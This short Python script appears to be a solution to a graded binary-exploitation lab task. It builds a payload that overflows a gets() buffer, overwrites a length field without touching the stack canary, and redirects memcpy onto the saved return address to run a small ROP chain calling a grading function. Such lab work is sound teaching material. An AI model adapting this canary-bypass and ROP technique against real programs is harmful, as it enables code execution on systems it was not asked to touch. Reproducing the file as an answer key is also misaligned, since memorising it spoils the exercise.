#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

memcpy(f.logMsg + f.len, f.expression, 128) runs after gets returns.
f.len lives at offset 256 of the gets buffer (before the canary at 280),
so we can overwrite it without touching the canary. Setting len = 168 makes
the memcpy destination land on saved rip, copying our first 128 bytes there.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x4018A3
GRADE_EVAL = 0x401677

rop = p64(POP_RDI_RET) + p64(4) + p64(GRADE_EVAL)
payload = rop.ljust(128, b"\x90")      # bytes copied by memcpy to saved rip
payload += b"B" * 128                  # covers logMsg
payload += struct.pack("<I", 168)      # overwrite f.len -> memcpy hits saved rip

sys.stdout.buffer.write(payload)
